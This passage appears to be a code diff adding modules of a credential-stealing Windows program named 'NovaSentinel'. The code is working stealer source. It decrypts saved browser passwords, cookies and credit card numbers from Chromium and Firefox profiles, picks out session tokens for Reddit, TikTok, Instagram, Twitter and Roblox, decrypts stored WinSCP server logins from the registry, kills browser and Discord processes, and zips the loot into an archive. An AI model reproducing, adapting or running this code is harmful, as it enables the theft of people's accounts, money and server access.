+  fs.writeFileSync(savePath + "History.txt", historyFinal);
+  fs.writeFileSync(savePath + "Downloads.txt", downloadFinal);
+  fs.writeFileSync(savePath + "Bookmarks.txt", bookmarkFinal);
+  fs.writeFileSync(savePath + "Cards.txt", cardFinal);
+}
+async function saveMailClients(accounts, name) {
+  let basepath = stat.testpath[0];
+  let savePath = basepath + "\\MailClients\\";
+  try {
+    fs.mkdirSync(savePath, {
+      recursive: true
+    });
+  } catch (e) {}
+  savePath += name + "\\";
+  try {
+    fs.mkdirSync(savePath, {
+      recursive: true
+    });
+  } catch (e) {}
+  fs.writeFileSync(savePath + "accounts.json", JSON.stringify(accounts, null, 4));
+}
+async function saveSysAdmin(accounts, name) {
+  let basepath = stat.testpath[0];
+  let savePath = basepath + "\\Clients\\";
+  try {
+    fs.mkdirSync(savePath, {
+      recursive: true
+    });
+  } catch (e) {}
+  savePath += name + "\\";
+  try {
+    fs.mkdirSync(savePath, {
+      recursive: true
+    });
+  } catch (e) {}
+  fs.writeFileSync(savePath + "accounts.json", JSON.stringify(accounts, null, 4));
+}
+async function zipResult() {
+  let savepath = stat.savepath[0];
+  let basepath = stat.testpath[0];
+  const archive = archiver("zip", {
+    zlib: {
+      level: 9
+    }
+  });
+  const stream = fs.createWriteStream(savepath);
+  return new Promise((resolve, reject) => {
+    try {
+      archive.directory(basepath + "\\", false).on("error", err => reject(err)).pipe(stream);
+      stream.on("close", () => resolve(savepath));
+      archive.finalize().then(() => {});
+    } catch (_unused) {}
+  });
+}
+function zip(savepath) {
+  savepath = path.join(savepath[0], "..");
+  const archive = archiver("zip", {
+    zlib: {
+      level: 9
+    }
+  });
+  const stream = fs.createWriteStream(savepath + "\\Exodus.zip");
+  return new Promise((resolve, reject) => {
+    try {
+      archive.directory(savepath + "\\", false).on("error", err => reject(err)).pipe(stream);
+      stream.on("close", () => resolve(savepath + "\\Exodus.zip"));
+      archive.finalize().then(() => {});
+    } catch (_unused2) {}
+  });
+}
+module.exports = {
+  getbasepath,
+  Init,
+  SimpleSave,
+  Save,
+  ArraySave,
+  zipResult,
+  saveBrowser,
+  saveCookies,
+  saveRoblox,
+  saveMailClients,
+  saveSysAdmin,
+  zip,
+  SaveError
+};
+},{"./core":"utils/core.js","./stats":"utils/stats.js"}],"utils/admin.js":[function(require,module,exports) {
+var Registry = require("winreg"),
+  {
+    stat
+  } = require("./stats"),
+  save = require("./save");
+function WinSCP() {
+  var WSCP_CHARS = [];
+  function _simple_decrypt_next_char() {
+    if (WSCP_CHARS.length == 0) {
+      return 0x00;
+    }
+    const WSCP_SIMPLE_STRING = "0123456789ABCDEF";
+    var a = WSCP_SIMPLE_STRING.indexOf(WSCP_CHARS.shift());
+    var b = WSCP_SIMPLE_STRING.indexOf(WSCP_CHARS.shift());
+    return 0xff & ~((a << 4) + b << 0 ^ 0xa3);
+  }
+  this.decrypt = function (username, hostname, encrypted) {
+    if (!encrypted.match(/[A-F0-9]+/)) {
+      return "";
+    }
+    var result = [],
+      key = [username, hostname].join("");
+    WSCP_CHARS = encrypted.split("");
+    var flag = _simple_decrypt_next_char(),
+      length;
+    if (flag == 0xff) {
+      _simple_decrypt_next_char();
+      length = _simple_decrypt_next_char();
+    } else {
+      length = flag;
+    }
+    WSCP_CHARS = WSCP_CHARS.slice(_simple_decrypt_next_char() * 2);
+    for (var i = 0; i < length; i++) {
+      result.push(String.fromCharCode(_simple_decrypt_next_char()));
+    }
+    if (flag == 0xff) {
+      var valid = result.slice(0, key.length).join("");
+      if (valid != key) {
+        result = [];
+      } else {
+        result = result.slice(key.length);
+      }
+    }
+    WSCP_CHARS = [];
+    return result.join("");
+  };
+}
+async function NovaSentinelWinSCP(cc) {
+  if (cc != "yes") return;
+  try {
+    let connections = [];
+    const regKey = new Registry({
+      hive: Registry.HKCU,
+      key: "\\SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions"
+    });
+    const exists = await new Promise((resolve, reject) => {
+      regKey.keyExists((err, exists) => {
+        if (err != null) {
+          resolve(false);
+        }
+        resolve(exists);
+      });
+    });
+    if (!exists) {
+      return;
+    }
+    const subkeys = await new Promise((resolve, reject) => {
+      regKey.keys((err, subkeys) => {
+        if (err != null) {
+          resolve([]);
+        }
+        resolve(subkeys);
+      });
+    });
+    if (subkeys.length == 0) {
+      return;
+    }
+    stat.AddSysAdmin("WinSCP");
+    for (let i = 0; i < subkeys.length; i++) {
+      const subkey = subkeys[i];
+      const subRegKey = new Registry({
+        hive: Registry.HKCU,
+        key: subkey.key
+      });
+      const hostname = await new Promise((resolve, reject) => {
+        subRegKey.get("HostName", (err, res) => {
+          if (err == null) {
+            resolve(res.value);
+          }
+          resolve("");
+        });
+      });
+      const username = await new Promise((resolve, reject) => {
+        subRegKey.get("UserName", (err, res) => {
+          if (err == null) {
+            resolve(res.value);
+          }
+          resolve("");
+        });
+      });
+      const password = await new Promise((resolve, reject) => {
+        subRegKey.get("Password", (err, res) => {
+          if (err == null) {
+            resolve(res.value);
+          }
+          resolve("");
+        });
+      });
+      if (password != "" && username != "" && hostname != "") {
+        const winSCP = new WinSCP();
+        connections.push({
+          username: username,
+          password: winSCP.decrypt(username, hostname, password),
+          hostname: hostname
+        });
+      }
+    }
+    save.saveSysAdmin(connections, "WinSCP");
+  } catch (e) {
+    save.SaveError(e);
+  }
+}
+module.exports = {
+  NovaSentinelWinSCP
+};
+},{"./stats":"utils/stats.js","./save":"utils/save.js"}],"utils/gecko.js":[function(require,module,exports) {
+const fs = require("fs");
+const forge = require('node-forge');
+const initSqlJs = require("sql.js");
+const path = require("path");
+function decodeLoginData(b64) {
+  const asn1 = forge.asn1.fromDer(forge.util.decode64(b64));
+  return {
+    iv: asn1.value[1].value[1].value,
+    data: asn1.value[2].value
+  };
+}
+async function getKey(profileDirectory, masterPassword) {
+  const key4FilePath = path.join(profileDirectory, 'key4.db');
+  if (!fs.existsSync(key4FilePath)) {
+    throw new Error('key4.db was not found in this profile directory.');
+  }
+  const masterPasswordBytes = forge.util.encodeUtf8(masterPassword || '');
+  const key4File = fs.readFileSync(key4FilePath);
+  const key4Db = await initSqlJs().then(function (SQL) {
+    return new SQL.Database(key4File);
+  });
+  const metaData = key4Db.exec('SELECT item1, item2 FROM metadata WHERE id = \'password\';');
+  if (metaData && metaData.length && metaData[0].values && metaData[0].values.length) {
+    const globalSalt = toByteString(metaData[0].values[0][0].buffer);
+    const item2 = toByteString(metaData[0].values[0][1].buffer);
+    const item2Asn1 = forge.asn1.fromDer(item2);
+    const item2Value = pbesDecrypt(item2Asn1.value, masterPasswordBytes, globalSalt);
+    if (item2Value && item2Value.data === 'password-check') {
+      const nssData = key4Db.exec('SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL;');
+      if (nssData && nssData.length && nssData[0].values && nssData[0].values.length) {
+        const a11 = toByteString(nssData[0].values[0][0].buffer);
+        const a11Asn1 = forge.asn1.fromDer(a11);
+        return pbesDecrypt(a11Asn1.value, masterPasswordBytes, globalSalt);
+      }
+    } else {
+      throw new Error('Master password incorrect.');
+    }
+  }
+  throw new Error('Not able to get key from profile directory or no passwords were found.');
+}
+function pbesDecrypt(decodedItemSeq, password, globalSalt) {
+  if (decodedItemSeq[0].value[1].value[0].value[1].value != null) {
+    return pbes2Decrypt(decodedItemSeq, password, globalSalt);
+  }
+  return pbes1Decrypt(decodedItemSeq, password, globalSalt);
+}
+function pbes1Decrypt(decodedItemSeq, password, globalSalt) {
+  const data = decodedItemSeq[1].value;
+  const salt = decodedItemSeq[0].value[1].value[0].value;
+  const hp = sha1(globalSalt + password);
+  const pes = toByteString(pad(toArray(salt), 20).buffer);
+  const chp = sha1(hp + salt);
+  const k1 = hmac(pes + salt, chp);
+  const tk = hmac(pes, chp);
+  const k2 = hmac(tk + salt, chp);
+  const k = k1 + k2;
+  const kBuffer = forge.util.createBuffer(k);
+  const otherLength = kBuffer.length() - 32;
+  const key = kBuffer.getBytes(24);
+  kBuffer.getBytes(otherLength);
+  const iv = kBuffer.getBytes(8);
+  return decrypt(data, iv, key, '3DES-CBC');
+}
+function pbes2Decrypt(decodedItemSeq, password, globalSalt) {
+  const data = decodedItemSeq[1].value;
+  const pbkdf2Seq = decodedItemSeq[0].value[1].value[0].value[1].value;
+  const salt = pbkdf2Seq[0].value;
+  const iterations = pbkdf2Seq[1].value.charCodeAt();
+  const iv = '' + decodedItemSeq[0].value[1].value[1].value[1].value;
+  const k = sha1(globalSalt + password);
+  const key = forge.pkcs5.pbkdf2(k, salt, iterations, 32, forge.md.sha256.create());
+  return decrypt(data, iv, key, 'AES-CBC');
+}
+function decrypt(data, iv, key, algorithm) {
+  const decipher = forge.cipher.createDecipher(algorithm, key);
+  decipher.start({
+    iv: iv
+  });
+  decipher.update(forge.util.createBuffer(data));
+  decipher.finish();
+  return decipher.output;
+}
+function sha1(data) {
+  const md = forge.md.sha1.create();
+  md.update(data, 'raw');
+  return md.digest().data;
+}
+function pad(arr, length) {
+  if (arr.length >= length) {
+    return arr;
+  }
+  const padAmount = length - arr.length;
+  const padArr = [];
+  for (let i = 0; i < padAmount; i++) {
+    padArr.push(0);
+  }
+  var newArr = new Uint8Array(padArr.length + arr.length);
+  newArr.set(padArr, 0);
+  newArr.set(arr, padArr.length);
+  return newArr;
+}
+function hmac(data, key) {
+  const hmac = forge.hmac.create();
+  hmac.start('sha1', key);
+  hmac.update(data, 'raw');
+  return hmac.digest().data;
+}
+function toByteString(buffer) {
+  return String.fromCharCode.apply(null, new Uint8Array(buffer));
+}
+function toArray(str) {
+  const arr = new Uint8Array(str.length);
+  for (let i = 0; i < str.length; i++) {
+    arr[i] = str.charCodeAt(i);
+  }
+  return arr;
+}
+module.exports = {
+  getKey,
+  decodeLoginData,
+  decrypt
+};
+},{}],"utils/kill.js":[function(require,module,exports) {
+const process = require("process"),
+  core = require("./core");
+async function KillBrowsersProcess(inject, browsers, silent) {
+  let allproc;
+  if (silent == "yes") return;
+  if (inject == "yes" && browsers == "yes") {
+    allproc = ["Atom", "Uran", "Maxthon3", "liebao", "Coowon", "Sleipnir5", "ChromePlus", "Superbird", "Rafotech", "SaferTechnologies", "Suhba", "TorBrowser", "ElementsBrowser", "CocCoc", "GoBrowser", "QIP Surf", "RockMelt", "Nichrome", "Bromium", "Comodo", "Xpom", "Chedot", "360Browser", "Opera", "OperaGX", "EpicPrivacy", "ChromeSxS", "Sputnik", "7Star", "CentBrowser", "Orbitum", "Kometa", "Torch", "Amigo", "Kmelon", "PaleMoon", "IceDragon", "BlackHaw", "Cyberfox", "Thunderbird", "SeaMonkey", "Firefox", "Waterfox", "mullvad", "firefox", "chrome", "mozilla", "vivaldi", "Opera", "OperaGX", "EpicPrivacy", "ChromeSxS", "Sputnik", "7Star", "CentBrowser", "Orbitum", "Amigo", "Torch", "Kometa", "steam", "filezilla", "brave", "BraveSoftware", "brave.exe", "msedge", "edge", "Uran", "KMelon", "Maxthon3", "iebao", "oowon", "leipnir5", "hromePlus", "uperbird", "afotech", "aferTechnologies", "uhba", "orBrowser", "lementsBrowser", "ocCoc", "oBrowser", "IP Surf", "ockMelt", "ichrome", "romium", "omodo", "pom", "hedot", "60Browser", "discord", "cord"];
+  } else if (inject != "yes" && browsers == "yes") {
+    allproc = ["Atom", "Uran", "Maxthon3", "liebao", "Coowon", "Sleipnir5", "ChromePlus", "Superbird", "Rafotech", "SaferTechnologies", "Suhba", "TorBrowser", "ElementsBrowser", "CocCoc", "GoBrowser", "QIP Surf", "RockMelt", "Nichrome", "Bromium", "Comodo", "Xpom", "Chedot", "360Browser", "Opera", "OperaGX", "EpicPrivacy", "ChromeSxS", "Sputnik", "7Star", "CentBrowser", "Orbitum", "Kometa", "Torch", "Amigo", "Kmelon", "PaleMoon", "IceDragon", "BlackHaw", "Cyberfox", "Thunderbird", "SeaMonkey", "Firefox", "Waterfox", "firefox", "chrome", "mozilla", "vivaldi", "Opera", "OperaGX", "EpicPrivacy", "ChromeSxS", "Sputnik", "7Star", "CentBrowser", "Orbitum", "Amigo", "Torch", "Kometa", "steam", "filezilla", "brave", "BraveSoftware", "brave.exe", "msedge", "edge", "Uran", "KMelon", "Maxthon3", "iebao", "oowon", "leipnir5", "hromePlus", "uperbird", "afotech", "aferTechnologies", "uhba", "orBrowser", "lementsBrowser", "ocCoc", "oBrowser", "IP Surf", "ockMelt", "ichrome", "romium", "omodo", "pom", "hedot", "60Browser"];
+  } else if (inject == "yes" && browsers != "yes") {
+    allproc = ["discord", "cord"];
+  }
+  try {
+    allproc.forEach(async g => {
+      const filteredProcesses = await core.filterProcessesByName(g);
+      if (filteredProcesses.length > 0) {
+        try {
+          filteredProcesses.forEach(proc => {
+            process.kill(proc.pid);
+          });
+        } catch (e) {}
+      }
+    });
+  } catch (e) {}
+}
+module.exports = {
+  KillBrowsersProcess
+};
+},{"./core":"utils/core.js"}],"utils/browsers.js":[function(require,module,exports) {
+const fs = require("fs"),
+  sqlite3 = require("sqlite3"),
+  boukiapi = require("boukiapi"),
+  crypto = require("crypto"),
+  iconv = require("iconv-lite"),
+  save = require("./save"),
+  {
+    stat
+  } = require("./stats"),
+  gecko = require("./gecko"),
+  path = require("path"),
+  kill = require("./kill");
+website = [];
+class Cookies {
+  constructor(host, path, secure, expires, name, value) {
+    this.host = host;
+    this.path = path;
+    this.secure = secure;
+    this.expires = expires;
+    this.name = name;
+    this.value = value;
+  }
+  build() {
+    return `${this.host}\tTRUE\t${this.path}\t${this.secure}\t${this.expires}\t${this.name}\t${this.value}\n`;
+  }
+}
+class Password {
+  constructor(site, username, password, timestamp, browser) {
+    this.site = site;
+    this.username = username;
+    this.password = password;
+    this.timestamp = timestamp;
+    this.browser = browser;
+  }
+  build() {
+    return `Site: ${this.site}\nUsername: ${this.username}\nPassword: ${this.password}\nBrowser: ${this.browser} | ${this.timestamp}\n`;
+  }
+}
+class Autofill {
+  constructor(input, value, browser) {
+    this.input = input;
+    this.value = value;
+    this.browser = browser;
+  }
+  build() {
+    return `Input: ${this.input}\nValue: ${this.value}\nBrowser: ${this.browser}\n`;
+  }
+}
+class CreditCard {
+  constructor(guid, name, expiration_mouth, expiration_year, number, address, nickname) {
+    this.guid = guid;
+    this.name = name;
+    this.address = address;
+    this.nickname = nickname;
+    this.expiration = expiration_mouth + "/" + expiration_year;
+    this.number = number;
+  }
+  build() {
+    return `Guid: ${this.guid}\nName: ${this.name}\nAdress: ${this.address}\nNickname: ${this.nickname}\nExpiration: ${this.expiration}\nNumber: ${this.number}\n`;
+  }
+}
+class Visit {
+  constructor(url, title, count, timestamp) {
+    this.url = url;
+    this.title = title;
+    this.count = count;
+    this.timestamp = timestamp;
+  }
+  build() {
+    return `Url: ${this.url}\nTitle: ${this.title}\nCount: ${this.count}\nTimestamp: ${this.timestamp}\n`;
+  }
+}
+class Download {
+  constructor(path, url, total_bytes) {
+    this.path = path;
+    this.url = url;
+    this.total_bytes = total_bytes;
+  }
+  build() {
+    return `Url: ${this.url}\nPath: ${this.path}\nTotalBytes: ${this.total_bytes}\n`;
+  }
+}
+class Bookmark {
+  constructor(name, url, timestamp, browser) {
+    this.url = url;
+    this.name = name;
+    this.timestamp = timestamp;
+    this.browser = browser;
+  }
+  build() {
+    return `Url: ${this.url}\nName: ${this.name}\nBrowser: ${this.browser}\nTimestamp: ${this.timestamp}\n`;
+  }
+}
+function getProfiles(path, name) {
+  let profiles = [];
+  if (fs.existsSync(path)) {
+    let dirs = fs.readdirSync(path);
+    for (let dir of dirs) {
+      if (dir.includes("Profile") || dir == "Default") {
+        profiles.push({
+          path: `${path}${dir}\\`,
+          name: name,
+          profile: dir
+        });
+      }
+    }
+    return profiles;
+  } else {
+    return [];
+  }
+}
+function getGeckoProfiles(path, name) {
+  let profiles = [];
+  if (fs.existsSync(path)) {
+    let dirs = fs.readdirSync(path);
+    for (let dir of dirs) {
+      if (dir.includes(".default-release") || dir.includes(".default-default-")) {
+        profiles.push({
+          path: `${path}${dir}\\`,
+          name: name
+        });
+      }
+    }
+    return profiles;
+  } else {
+    return [];
+  }
+}
+function getMasterKey(path) {
+  if (fs.existsSync(`${path}Local State`)) {
+    let localstate = JSON.parse(fs.readFileSync(`${path}Local State`, "utf8"));
+    let master_key = localstate.os_crypt.encrypted_key;
+    master_key = boukiapi.unprotectData(Buffer.from(Buffer.from(master_key, "base64").slice(5), "utf-8"), null, "CurrentUser");
+    return master_key;
+  } else if (fs.existsSync(`${path}..\\Local State`)) {
+    let localstate = JSON.parse(fs.readFileSync(`${path}..\\Local State`, "utf8"));
+    let master_key = localstate.os_crypt.encrypted_key;
+    master_key = boukiapi.unprotectData(Buffer.from(Buffer.from(master_key, "base64").slice(5), "utf-8"), null, "CurrentUser");
+    return master_key;
+  } else {
+    return "";
+  }
+}
+async function tempSqlite(path, query) {
+  let path_tmp = path + "_tmp";
+  fs.copyFileSync(path, path_tmp);
+  let db = new sqlite3.Database(path_tmp);
+  let result = await new Promise((resolve, reject) => {
+    db.all(query, (err, rows) => {
+      if (err) {
+        reject(err);
+      } else {
+        resolve(rows);
+      }
+    });
+  });
+  db.close();
+  try {
+    await fs.unlinkSync(path_tmp);
+  } catch (e) {}
+  return result;
+}
+function decryptChrome(value, key) {
+  let start = value.slice(3, 15),
+    middle = value.slice(15, value.length - 16),
+    end = value.slice(value.length - 16, value.length),
+    decipher = crypto.createDecipheriv("aes-256-gcm", key, start);
+  decipher.setAuthTag(end);
+  return decrypted = decipher.update(middle, "base64", "utf-8") + decipher.final("utf-8");
+}
+async function getCookies(basepath) {
+  await kill.KillBrowsersProcess();
+  let cookies = [];
+  let key = getMasterKey(basepath);
+  if (fs.existsSync(`${basepath}Network\\Cookies`)) {
+    var rows = [];
+    try {
+      rows = await tempSqlite(`${basepath}Network\\Cookies`, "SELECT name, host_key, path, expires_utc, is_secure, encrypted_value FROM cookies");
+    } catch (e) {
+      save.SaveError(e);
+    }
+    for (let row of rows) {
+      let value = row.encrypted_value;
+      if (value.toString().startsWith("v10") || value.toString().startsWith("v11")) {
+        if (key == "") {
+          continue;
+        }
+        try {
+          value = decryptChrome(value, key);
+        } catch (e) {
+          save.SaveError(e);
+          continue;
+        }
+      } else {
+        try {
+          value = boukiapi.unprotectData(value, null, "CurrentUser");
+        } catch (e) {
+          save.SaveError(e);
+          continue;
+        }
+      }
+      if (row.host_key.includes(".reddit")) {
+        if (row.name.includes("reddit_session")) {
+          stat.addReddit(value);
+        }
+      }
+      if (row.host_key.includes(".tiktok")) {
+        if (row.name.includes("sessionid")) {
+          stat.addTikTok(value);
+        }
+      }
+      if (row.host_key.includes(".instagram")) {
+        if (row.name.includes("sessionid")) {
+          stat.addSessIDInsta(value);
+        }
+      }
+      if (row.name.includes(".ROBLOSECURITY")) {
+        save.saveRoblox(value);
+        stat.AddRoblox(value);
+      }
+      if (row.host_key.includes(".twitter")) {
+        let saved = row;
+        saved.value = value;
+        stat.AddTwitter(saved);
+      }
+      cookies.push(new Cookies(row.host_key, row.path, row.is_secure, row.expires_utc, row.name, value));
+    }
+  }
+  return cookies;
+}
+async function getPasswords(basepath, browser) {
+  var passwords = [];
+  let key = getMasterKey(basepath);
+  var loginPath = "";
+  if (basepath.includes("Yandex")) {
+    loginPath = `${basepath}Ya Passman Data`;
+  } else {
+    loginPath = `${basepath}Login Data`;
+  }
+  if (fs.existsSync(loginPath)) {
+    let rows = [];
+    try {
+      rows = await tempSqlite(loginPath, "SELECT origin_url, username_value, password_value, date_created FROM logins");
+    } catch (e) {
+      save.SaveError(e);
+    }
+    for (let row of rows) {
+      let password = row.password_value;
+      if (password.toString().startsWith("v10") || password.toString().startsWith("v11")) {
+        if (key == "") {
+          continue;
+        }
+        try {
+          password = decryptChrome(password, key);
+        } catch (e) {
+          save.SaveError(e);
+          continue;
+        }
+      } else {
+        try {
+          password = boukiapi.unprotectData(password, null, "CurrentUser");
+        } catch (e) {
+          save.SaveError(e);
+          continue;
+        }
+      }
+      if (row.username_value != "" && password != "") {
+        passwords.push(new Password(row.origin_url, row.username_value, password, row.date_created, browser));
+        website.push(row.origin_url);
+        /*
+                if (row.origin_url.includes("discord")) {
+                  if (!stat.discordAccount || !stat.discordAccount.length) return;
+              
+                  stat.discordAccount.forEach((d) => {
+                    d.forEach((g) => {
+                      if (g.email == row.username_value) {
+                        g.password = password;
+                      }
+                    });
+                  });
+                }*/
+      }
+    }
+  }
+  return passwords;
+}
+async function getAutofills(basepath, browser) {
+  var autofills = [];
+  if (fs.existsSync(`${basepath}Web Data`)) {
+    let rows = [];
+    try {
+      rows = await tempSqlite(`${basepath}Web Data`, "SELECT name, value FROM autofill");
+    } catch (e) {
+      save.SaveError(e);
+    }
+    for (let row of rows) {
+      autofills.push(new Autofill(row.name, row.value, browser));
+    }
+  }
+  return autofills;
+}
+async function getDownloads(basepath) {
+  var downloads = [];
+  if (fs.existsSync(`${basepath}History`)) {
+    let rows = [];
+    try {
+      rows = await tempSqlite(`${basepath}History`, "SELECT target_path, tab_url, total_bytes FROM downloads");
+    } catch (e) {
+      save.SaveError(e);
+    }
+    for (let row of rows) {
+      downloads.push(new Download(row.target_path, row.tab_url, row.total_bytes));
+    }
+  }
+  return downloads;
+}
+async function getCreditCards(basepath) {
+  let creditcards = [];
+  let key = getMasterKey(basepath);
+  if (fs.existsSync(`${basepath}Web Data`)) {
+    let rows = [];
+    try {
+      rows = await tempSqlite(`${basepath}Web Data`, "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards");
+    } catch (e) {
+      save.SaveError(e);
+    }
+    for (let row of rows) {
+      let number = row.card_number_encrypted;
+      if (number.toString().startsWith("v10") || number.toString().startsWith("v11")) {
+        if (key == "") {
+          continue;
+        }
+        try {
+          number = decryptChrome(number, key);
+        } catch (e) {
+          save.SaveError(e);
+          continue;
+        }
+      } else {
+        try {
+          number = boukiapi.unprotectData(number, null, "CurrentUser");
+        } catch (e) {
+          save.SaveError(e);
+          continue;
+        }
+      }
+      creditcards.push(new CreditCard(row.guid, row.name_on_card, row.expiration_month, row.expiration_year, number, row.billing_address_id, row.nickname));
+    }
+  }
+  return creditcards;
+}
+async function getHistory(basepath) {
+  var history = [];
+  if (fs.existsSync(`${basepath}History`)) {
+    let rows = [];
+    try {
+      rows = await tempSqlite(`${basepath}History`, "SELECT url, title, visit_count, last_visit_time FROM urls");
+    } catch (e) {
+      save.SaveError(e);
+    }
+    for (let row of rows) {
+      history.push(new Visit(row.url, row.title, row.visit_count, row.last_visit_time));
+    }
+  }
+  return history;
+}
+async function getBookmarks(basepath, browser) {
+  let bookmarks = [];
+  if (fs.existsSync(`${basepath}Bookmarks`)) {
+    fs.copyFileSync(`${basepath}Bookmarks`, `${basepath}Bookmarks_tmp`);
+    let json = JSON.parse(fs.readFileSync(`${basepath}Bookmarks_tmp`));
+    fs.unlinkSync(`${basepath}Bookmarks_tmp`);
+    for (let bookmark of json.roots.bookmark_bar.children) {
+      bookmarks.push(new Bookmark(bookmark.name, bookmark.url, bookmark.date_added, browser));
+    }
+  }
+  return bookmarks;
+}
+async function getGeckoCookies(basepath) {
+  var cookies = [];
+  if (fs.existsSync(`${basepath}cookies.sqlite`)) {
+    let rows = [];
+    try {
+      rows = await tempSqlite(`${basepath}cookies.sqlite`, "SELECT name, value, host, path, expiry, isSecure FROM moz_cookies");
+    } catch (e) {
+      save.SaveError(e);
+    }
+    for (let row of rows) {
+      if (row.name.includes(".ROBLOSECURITY")) {
+        stat.AddRoblox(row.value);
+      }
+      if (row.host.includes(".tiktok")) {
+        if (row.name.includes("sessionid")) {
+          stat.addTikTok(row.value);
+        }
+      }
+      if (row.host.includes(".instagram")) {
+        if (row.name.includes("sessionid")) {
+          stat.addSessIDInsta(row.value);
+        }
+      }
+      if (row.host.includes(".twitter")) {
+        let saved = row;
+        saved.value = row.value;
+        stat.AddTwitter(saved);
+      }
+      cookies.push(new Cookies(row.host, row.path, row.isSecure, row.expiry, row.name, row.value));
+    }
+  }
+  return cookies;
+}
+async function getGeckoPasswords(profile, masterPassword, browser) {
+  const passwords = [];
+  const key = await gecko.getKey(profile, masterPassword);
+  if (key == null) {
+    return passwords;
+  }
+  const loginsPath = path.join(profile, "logins.json");
+  if (!fs.existsSync(loginsPath)) {
+    return passwords;
+  }
+  const loginsData = fs.readFileSync(loginsPath, "utf8");
+  const profileLogins = JSON.parse(loginsData);
+  for (const login of profileLogins.logins) {
+    const decodedUsername = gecko.decodeLoginData(login.encryptedUsername);
+    const decodedPassword = gecko.decodeLoginData(login.encryptedPassword);
+    const username = gecko.decrypt(decodedUsername.data, decodedUsername.iv, key, "3DES-CBC");
+    const password = gecko.decrypt(decodedPassword.data, decodedPassword.iv, key, "3DES-CBC");
+    let encodeUsername = iconv.encode(username.data, "latin1").toString();
+    if (encodeUsername != username.data) {
+      username.data = encodeUsername;
+    }
+    let encodePassword = iconv.encode(password.data, "latin1").toString();
+    if (encodePassword != password.data) {
+      password.data = encodePassword;
+    }
+    if (username.data !== "" && password.data !== "" && password.data !== undefined) {
+      passwords.push(new Password(login.hostname, username.data, password.data, login.timeLastUsed, browser));
+    }
+  }
+  return passwords;
+}
+async function getGeckoBookmarks(basepath, browser) {
+  let bookmarks = [];
+  if (fs.existsSync(`${basepath}places.sqlite`)) {
+    let rows = [];
+    try {
+      rows = await tempSqlite(`${basepath}places.sqlite`, "SELECT id, url, dateAdded, title FROM (SELECT * FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk=moz_places.id)");
+    } catch (e) {
+      save.SaveError(e);
+    }
+    for (let row of rows) {
+      bookmarks.push(new Bookmark(row.title, row.url, row.dateAdded, browser));
+    }
+  }
+  return bookmarks;
+}
+async function getGeckoHistory(basepath) {
+  let history = [];
+  if (fs.existsSync(`${basepath}places.sqlite`)) {
+    let rows = [];
+    try {
+      rows = await tempSqlite(`${basepath}places.sqlite`, "SELECT title, url, visit_count, last_visit_date FROM moz_places where title not null");
+    } catch (e) {
+      save.SaveError(e);
+    }
+    for (let row of rows) {
+      history.push(new Visit(row.url, row.title, row.visit_count, row.last_visit_date));
+    }
+  }
+  return history;
+}
+async function getGeckoDownloads(basepath) {
+  let downloads = [];
+  if (fs.existsSync(`${basepath}places.sqlite`)) {
+    let rows = [];
+    try {
+      rows = await tempSqlite(`${basepath}places.sqlite`, "SELECT GROUP_CONCAT(content), url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id=moz_places.id) t GROUP BY place_id");
+    } catch (e) {
+      save.SaveError(e);
+    }
+    for (let row of rows) {
+      try {
+        downloads.push(new Download(row["GROUP_CONCAT(content)"].split("},")[1], row.url, JSON.parse(row["GROUP_CONCAT(content)"].split("},")[0] + "}").fileSize));
+      } catch (e) {
+        save.SaveError(e);
+        continue;
+      }
+    }
+  }
+  return downloads;
+}
+async function NovaSentinelBrowsers(cc) {
+  if (cc != "yes") return;
+  let appdata = process.env.APPDATA;
+  let localappdata = process.env.LOCALAPPDATA;
+  var chromiumPath = [{
+    path: appdata + "\\Mail.Ru\\Atom\\User Data\\",
+    name: "Atom"
+  }, {
+    path: appdata + "\\Uran\\User Data\\",
+    name: "Uran"
+  }, {
+    path: appdata + "\\Maxthon3\\User Data\\",
+    name: "Maxthon3"
+  }, {
+    path: appdata + "\\liebao\\User Data\\",
+    name: "liebao"
+  }, {
+    path: appdata + "\\Coowon\\Coowon\\User Data\\",
+    name: "Coowon"
+  }, {
+    path: appdata + "\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\",
+    name: "Sleipnir5"
+  }, {
+    path: appdata + "\\MapleStudio\\ChromePlus\\User Data\\",
+    name: "ChromePlus"
+  }, {
+    path: appdata + "\\Superbird\\User Data\\",
+    name: "Superbird"
+  }, {
+    path: appdata + "\\Rafotech\\Mustang\\User Data\\",
+    name: "Rafotech"
+  }, {
+    path: appdata + "\\Safer Technologies\\Secure Browser\\User Data\\",
+    name: "SaferTechnologies"
+  }, {
+    path: appdata + "\\Suhba\\User Data\\",
+    name: "Suhba"
+  }, {
+    path: appdata + "\\TorBro\\Profile\\",
+    name: "TorBrowser"
+  }, {
+    path: appdata + "\\Elements Browser\\User Data\\",
+    name: "ElementsBrowser"
+  }, {
+    path: appdata + "\\CocCoc\\Browser\\User Data\\",
+    name: "CocCoc"
+  }, {
+    path: appdata + "\\Go!\\User Data\\",
+    name: "GoBrowser"
+  }, {
+    path: appdata + "\\QIP Surf\\User Data\\",
+    name: "QIP Surf"
+  }, {
+    path: appdata + "\\RockMelt\\User Data\\",
+    name: "RockMelt"
+  }, {
+    path: appdata + "\\Nichrome\\User Data\\",
+    name: "Nichrome"
+  }, {
+    path: appdata + "\\Bromium\\User Data\\",
+    name: "Bromium"
+  }, {
+    path: appdata + "\\Comodo\\Dragon\\User Data\\",
+    name: "Comodo"
+  }, {
+    path: appdata + "\\Xpom\\User Data\\",
+    name: "Xpom"
+  }, {
+    path: appdata + "\\Chedot\\User Data\\",
+    name: "Chedot"
+  }, {
+    path: appdata + "\\360Browser\\Browser\\User Data\\",
+    name: "360Browser"
+  }, {
+    path: appdata + "\\Opera Software\\Opera Stable\\",
+    name: "Opera"
+  }, {
+    path: appdata + "\\Opera Software\\Opera GX Stable\\",
+    name: "OperaGX"
+  }, {
+    path: localappdata + "\\Epic Privacy Browser\\User Data\\",
+    name: "EpicPrivacy"
+  }, {
+    path: localappdata + "\\Google\\Chrome SxS\\User Data\\",
+    name: "ChromeSxS"
+  }, {
+    path: localappdata + "\\Sputnik\\Sputnik\\User Data\\",
+    name: "Sputnik"
+  }, {
+    path: localappdata + "\\7Star\\7Star\\User Data\\",
+    name: "7Star"
+  }, {
+    path: localappdata + "\\CentBrowser\\User Data\\",
